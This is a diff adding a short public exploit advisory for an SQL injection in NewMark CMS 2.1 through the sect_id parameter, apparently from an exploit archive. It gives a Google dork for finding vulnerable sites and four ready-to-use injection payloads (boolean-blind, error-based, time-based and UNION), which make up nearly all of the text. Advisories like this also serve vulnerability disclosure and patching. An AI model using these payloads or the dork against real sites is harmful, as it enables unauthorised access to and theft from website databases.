@@ -1,0 +1,37 @@
+# Exploit Title: NewMark CMS 2.1 - SQL Injection (sec_id)
+# Google Dork: /catalog/?sect_id=
+# Date: 2018-06-20
+# Exploit Author: Berk Dusunur
+# Vendor Homepage: https://nmark.ru/
+# Software Link: https://nmark.ru/razrabotka/korporativniy-sayt/
+# Version: v2.1
+# Tested on: Pardus
+# CVE : N/A
+
+# Prof Of Consept
+# sec id parameter affected by sql injection
+
+# payload:
+http://Target/catalog/?sect_id=e00d4757
+
+# Parameter: sect_id (GET)
+# Type: boolean-based blind
+# Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+
+Payload: sect_id=-7753" OR 1455=1455#
+
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+# 
+
+Payload: sect_id=e00d4757" AND (SELECT 6440 FROM(SELECT COUNT(*),CONCAT(0x71717a7171,(SELECT(ELT(6440=6440,1))),0x716a7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- twet
+
+# Type: AND/OR time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind
+
+Payload: sect_id=e00d4757" AND SLEEP(5)-- UNpo
+
+# Type: UNION query
+# Title: MySQL UNION query (NULL) - 2 columns
+
+Payload: sect_id=-1642" UNION ALL SELECT CONCAT(0x71717a7171,0x6f6a4d7666725478634c4d4657504e646650437571724b634c437176506149794645795a67424c67,0x716a7a6b71),NULL#
